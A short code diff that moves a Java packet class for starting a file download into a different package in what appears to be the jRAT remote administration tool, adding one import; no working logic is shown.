@@ -1,8 +1,9 @@
-package jrat.controller.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 import jrat.controller.Slave;
+import jrat.controller.packets.incoming.IncomingPacket;
 
 
 public class Packet30BeginServerDownload implements IncomingPacket {
